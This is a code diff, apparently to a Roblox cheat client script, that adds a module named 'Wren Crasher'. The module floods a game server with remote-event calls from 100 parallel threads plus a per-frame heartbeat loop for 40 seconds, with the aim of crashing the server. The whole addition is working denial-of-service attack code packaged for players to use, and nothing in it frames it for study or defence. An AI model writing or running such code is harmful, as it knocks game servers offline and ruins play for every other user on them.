@@ -19374,3 +19374,72 @@ OtherAntiCrash = vape.Categories.Minigames:CreateModule({
 })
 
 end)
+
+run(function()
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local events = ReplicatedStorage:WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events")
+local useAbility = events:WaitForChild("useAbility")
+
+local THREAD_COUNT = 100
+local BATCH_SIZE = 100
+local USE_HEARTBEAT = true
+local DURATION = 40
+
+local Crasher1
+local threads = {}
+local heartbeatConnection = nil
+local stopTimer = nil
+
+local function fire()
+    useAbility:FireServer("close_black_market")
+end
+
+local function spamThread()
+    while Crasher1.Enabled do
+        for _ = 1, BATCH_SIZE do
+            fire()
+        end
+        task.wait(0)
+    end
+end
+
+local function onHeartbeat()
+    if Crasher1.Enabled then
+        fire()
+    end
+end
+
+Crasher1 = vape.Categories.Minigames:CreateModule({
+    Name = 'Wren Crasher',
+    Function = function(callback)
+        if callback then
+            for i = 1, THREAD_COUNT do
+                table.insert(threads, task.spawn(spamThread))
+            end
+            if USE_HEARTBEAT then
+                heartbeatConnection = RunService.Heartbeat:Connect(onHeartbeat)
+            end
+            stopTimer = task.delay(DURATION, function()
+                stopTimer = nil
+                Crasher1:Toggle()
+            end)
+        else
+            for _, t in pairs(threads) do
+                task.cancel(t)
+            end
+            threads = {}
+            if heartbeatConnection then
+                heartbeatConnection:Disconnect()
+                heartbeatConnection = nil
+            end
+            if stopTimer then
+                task.cancel(stopTimer)
+                stopTimer = nil
+            end
+        end
+    end,
+    Tooltip = 'yes 1',
+})
+end)
